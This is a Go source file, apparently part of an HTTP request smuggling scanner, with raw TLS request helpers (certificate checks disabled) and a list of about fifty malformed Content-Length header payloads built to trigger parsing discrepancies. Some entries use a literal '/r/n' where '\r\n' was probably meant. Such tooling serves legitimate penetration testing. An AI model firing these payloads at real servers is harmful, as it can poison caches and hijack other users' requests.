package main

import (
	"bufio"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"net/url"
	"strings"
	"time"
)

var tlsConn *tls.Conn

func createTCPConnection(host string, port int) (net.Conn, error) {
	return net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
}

func createTLSConnection(conn net.Conn) (*tls.Conn, error) {
	return tls.Client(conn, &tls.Config{InsecureSkipVerify: true}), nil
}

func sendRequest(requestFormat string, args ...interface{}) error {
	request := fmt.Sprintf(requestFormat, args...)
	_, err := tlsConn.Write([]byte(request))
	if err != nil {
		return fmt.Errorf("Error sending request: %v", err)
	}
	return nil
}

func readFullResponse(responsePrefix string, responseCount int) (string, error) {
	var responseBuilder strings.Builder
	buffer := make([]byte, 16384) // Adjust the buffer size as needed

	// Count the number of occurrences of responsePrefix
	count := 0

	// Set a default timeout of 1 second
	timeout := 2 * time.Second

	for {
		// Set a read deadline to avoid blocking indefinitely
		err := tlsConn.SetReadDeadline(time.Now().Add(timeout))
		if err != nil {
			return "", err
		}

		n, err := tlsConn.Read(buffer)
		if err != nil {
			// If timeout is reached, break the loop
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}

			// Return other non-timeout errors
			if err != io.EOF {
				return "", err
			}
		}

		// Break immediately if no data is available to read
		if n == 0 {
			break
		}

		// Process the read data
		responseBuilder.Write(buffer[:n])

		// Check for the occurrence of responsePrefix
		if strings.Contains(responseBuilder.String(), responsePrefix) {
			count++

		}

		// Check for EOF
		if err == io.EOF {
			break
		}
	}

	return responseBuilder.String(), nil
}

func splitAndCombineResponses(combinedResponse string) (responses1, responses2 string, err error) {
	// Use strings.SplitN to avoid unnecessary splits
	splitResult := strings.SplitN(combinedResponse, "HTTP/1.1", 3)

	// Check if the split operation produced at least three elements
	if len(splitResult) >= 3 {
		// Use index 1 and 2 to access the second and third elements
		res1 := "HTTP/1.1" + splitResult[1]
		res2 := "HTTP/1.1" + splitResult[2]
		return res1, res2, nil
	} else {
		// Handle the case where the split operation did not produce the expected result
		return "", "", errors.New("Unable to split the string as expected")
	}
}

func parseURL(inputURL string) (port, rootURL, path string, err error) {
	// Parse the input URL
	parsedURL, err := url.Parse(inputURL)
	if err != nil {
		return "", "", "", err
	}

	// Extract port from the Host
	hostParts := strings.Split(parsedURL.Host, ":")
	if len(hostParts) > 1 {
		port = hostParts[1]
	} else {
		// Port not specified in URL, set default based on the scheme
		if parsedURL.Scheme == "https" {
			port = "443"
		} else if parsedURL.Scheme == "http" {
			port = "80"
		}
	}

	// Construct root URL without the port and protocol
	rootURL = hostParts[0]

	// Extract path
	path = parsedURL.Path

	// If path is empty, set it to "/"
	if path == "" {
		path = "/"
	}

	return port, rootURL, path, nil
}

func splitHTTPResponse(response string) (string, string, error) {
	// Find the position of the first double newline
	index := strings.Index(response, "\r\n\r\n")

	// Ensure that a double newline is found
	if index == -1 {
		return "", "", fmt.Errorf("malformed HTTP response")
	}

	// Extract headers and body
	headers := strings.TrimSpace(response[:index])
	body := strings.TrimSpace(response[index+2:])

	return headers, body, nil
}

func extractStatusCode(rawResponse string) (int, error) {
	// Create a scanner to read from the raw response string
	scanner := bufio.NewScanner(strings.NewReader(rawResponse))

	// Read the first line
	if scanner.Scan() {
		// Extract the status code from the status line
		statusLine := scanner.Text()
		var statusCode int
		_, err := fmt.Sscanf(statusLine, "HTTP/1.1 %d", &statusCode)
		if err != nil {
			return 0, err
		}
		return statusCode, nil
	}

	// If the first line cannot be read, return an error
	return 0, fmt.Errorf("malformed HTTP response")
}

var payload_list = []string{
	"Content-Length: 32\r\n\r\n",
	"Content-Length: 0 32\r\n\r\n",
	"Content-Length: 0, 32\r\n\r\n",
	"Content-Length\n : 32\r\n\r\n",
	"cONTENT-LENGTH: 32\r\n\r\n",
	"Content-Length: 0000000000032\r\n\r\n",
	"Content-Length: 32e0\r\n\r\n",
	"Content-Length:\n 32\r\n\r\n",
	"Content-Length: \r\n\t32\r\n\r\n",
	"X-Blah-Ignore: 32\r\n\r\n",
	"Content-Length: 032\r\n\r\n",
	"Content-Length: \n32\r\n\r\n",
	"Content-Length:\032\r\n\r\n",
	"Content-Length x: 32\r\n\r\n",
	"Content-Length\r: 32\r\n\r\n",
	"Content-Length: 32\r\n\r\n", "Content-Length:\t32\r\n\r\n",
	"Content-Length: 32\\0\r\n\r\n",
	"Content-Length:32\r\n\r\n",
	"Content-Length: \t32\r\n\r\n",
	"Content-Length: 32\r\nRange: bytes=0-0\r\n\r\n",
	"Content-Length: 32\r\r\n\r\n",
	"Content-Length: \032\r\n\r\n",
	"Content-Length: 32\r\n\r\n", "Content-Length:\r32/r/n/r/n",
	"Content-Length: 32/r/n/r/n",
	"Content-Length:32/r/n/r/n", "Content-Length: 32\t/r/n/r/n",
	"Content-Length: -32/r/n/r/n",
	"Content-Length:ÿ32/r/n/r/n",
	"CONTENT-LENGTH: 32/r/n/r/n",
	"Content\\Length: 32/r/n/r/n",
	"Content-Length: +32/r/n/r/n",
	"Content-Length: 32/r/nExpect: 100-continue/r/n/r/n",
	"Foo: bar\r\n\rContent-Length: 32/r/n/r/n",
	"Foo: bar\r\n Content-Length: 32\r\n\r\n",
	"Content-Length: 32\r\n\r\n",
	"Foo: bar\r\n\tContent-Length: 32\r\n\r\n",
	"Con\rtent-Length: 32\r\n\r\n",
	"Foo: bar\rContent-Length: 32\r\n\r\n",
	"Content-Length:  32\r\n\r\n",
	"Content-Length\\0:32\r\n\r\n",
	"Content-Length: 32\t\r\n\r\n",
	"Content-Length\t: 32\r\n\r\n",
	"Foo: bar\rContent-Length: 32\r\n\r\n",
	"X-Invalid Y:\r\nContent-Length: 32\r\n\r\n",
	"Nothing-interesting: 1\r\n\r\n",
	"Content-Length: 32\r\n\r\n",
	"Content-Length : 32\r\n\r\n",
}
